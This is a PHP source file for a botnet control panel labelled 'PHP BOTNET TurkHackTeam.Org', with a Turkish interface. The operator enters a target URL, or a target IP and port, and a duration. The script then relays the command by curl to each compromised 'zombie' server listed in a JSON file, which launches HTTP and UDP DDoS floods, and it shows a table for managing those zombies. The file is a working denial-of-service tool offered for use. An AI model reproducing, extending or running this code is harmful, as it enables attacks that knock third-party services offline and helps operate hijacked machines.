<?php

if (isset($_POST['targetUrlHttp']) && isset($_POST['durationHttp'])) {
    $targetUrlHttp = $_POST['targetUrlHttp']; 
    $durationHttp = $_POST['durationHttp']; 
}

if (isset($_POST['targetIp']) && isset($_POST['targetPort']) && isset($_POST['durationUdp'])) {
    $targetIp = $_POST['targetIp'];
    $targetPort = $_POST['targetPort'];
    $durationUdp = $_POST['durationUdp'];
}



$jsonFile = 'url.json';
$servers = [];

if (file_exists($jsonFile)) {
    $servers = json_decode(file_get_contents($jsonFile), true);
}


foreach ($servers as $server) {
    $postData = [
        'targetUrlHttp' => $targetUrlHttp,
        'durationHttp' => $durationHttp,
        'targetPort' => $targetPort,
        'targetIp' => $targetIp,
        'durationUdp' => $durationUdp
    ];

    $ch = curl_init($server);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_exec($ch);
    curl_close($ch);
}



?>
<!DOCTYPE html>
<html>
<head>
    <title>PHP BOTNET TurkHackTeam.Org</title>
    <style>
        body {
            background-color: #000;
            color: #00FF00;
            font-family: 'Courier New', monospace;
            text-align: center;
            animation: backgroundAnimation 30s infinite;
        }

        h1 {
            color: #00FF00;
        }

        form {
            margin-top: 20px;
        }

        input[type="text"], input[type="number"] {
            background-color: #333;
            color: #00FF00;
            border: none;
            padding: 10px;
            margin-right: 10px;
            width: 60%;
        }

        input[type="submit"] {
            background-color: #00FF00;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        marquee{
            font-family: fantasy;
            font-size: 25px;
        }

        h2 {
            margin-top: 30px;
        }

        table {
            width: 80%;
            margin: 0 auto;
            border-collapse: collapse;
        }

        table, th, td {
            border: 1px solid #00FF00;
        }

        th, td {
            padding: 10px;
            text-align: center;
        }

        a {
            text-decoration: none;
            color: #00FF00;
        }

        a:hover {
            text-decoration: underline;
        }

    </style>
</head>
<body>
    <img src="tht.png">
    <h1>PHP BOTNET Yöneticisi</h1>

    <h2>DDoS İstekleri Gönder</h2>
    <input type="button" value="DDoS At" onclick="toggleInputs()" style="background-color: #333; color: #00FF00; border: none; padding: 10px; margin-right: 10px; width: 10%;">
    <br><br>
    <div id="inputs" style="display: none;">
        <!-- HTTP DDoS İstekleri Gönderme Formu -->
        <form method="POST" action="">
            <h3>HTTP DDoS İstekleri Gönder</h3>
            <input type="text" name="targetUrlHttp" placeholder="Hedef URL'yi girin">
            <br><br>
            <input type="number" name="durationHttp" placeholder="Süre (dakika)">
            <br><br>
            <input type="submit" value="HTTP İstekleri Gönder">
        </form>

        <!-- UDP DDoS İstekleri Gönderme Formu -->
        <form method="POST" action="">
            <h3>UDP DDoS İstekleri Gönder</h3>
            <input type="text" name="targetIp" placeholder="Hedef IP'yi girin">
            <br><br>
            <input type="number" name="targetPort" placeholder="Hedef Port">
            <br><br>
            <input type="number" name="durationUdp" placeholder="Süre (dakika)">
            <br><br>
            <input type="submit" value="UDP İstekleri Gönder">
        </form>

        <input type="button" value="Alanları Kapat" onclick="toggleInputs()" style="background-color: #333; color: #00FF00; border: none; padding: 10px; margin-right: 10px; width: 10%;">
    </div>

    <script>
        function toggleInputs() {
            var inputsDiv = document.getElementById('inputs');

            if (inputsDiv.style.display === 'none' || inputsDiv.style.display === '') {
                inputsDiv.style.display = 'block';
            } else {
                inputsDiv.style.display = 'none';
            }
        }
    </script>


    <h2>Eklenen Zombie'ler</h2>
    <table>
        <tr>
            <th>ID</th>
            <th>URL</th>
            <th>Durum</th>
            <th>İşlem</th>
        </tr>
        <?php
        $jsonFile = 'urls.json';
        $urls = [];

        if (file_exists($jsonFile)) {
            $urls = json_decode(file_get_contents($jsonFile), true);
        }

        foreach ($urls as $id => $urlData) {
            echo "<tr>";
            echo "<td>$id</td>";
            echo "<td>{$urlData['url']}</td>";
            echo "<td>{$urlData['status']}</td>";
            echo "<td><a href='delete.php?id=$id'>Sil</a></td>";
            echo "</tr>";
        }
        ?>
    </table>
    <br><br>
    <marquee>Coded By P4$A</marquee>
</body>
</html>
